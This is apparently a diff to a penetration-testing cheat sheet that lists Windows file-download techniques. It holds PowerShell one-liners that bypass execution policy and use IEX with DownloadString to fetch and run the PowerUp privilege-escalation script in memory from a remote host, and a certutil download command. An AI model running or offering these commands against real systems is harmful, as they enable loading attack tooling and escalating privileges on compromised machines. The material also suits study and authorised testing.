@@ -6,10 +6,10 @@
 
 #### Download In-Memory:
 
-* powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://\<PRIVESC URL\>’); Invoke-AllChecks”
+* powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://.../PowerUp.ps1'); Invoke-AllChecks"
 
 ## Simple Download:
 
 * certutil -urlcache -split -f "http://..."
 
-* IEX (New-Object Net.WebClient).DownloadString(‘http://...’)
+* IEX (New-Object Net.WebClient).DownloadString('http://.../PowerUp.ps1'); Invoke-AllChecks
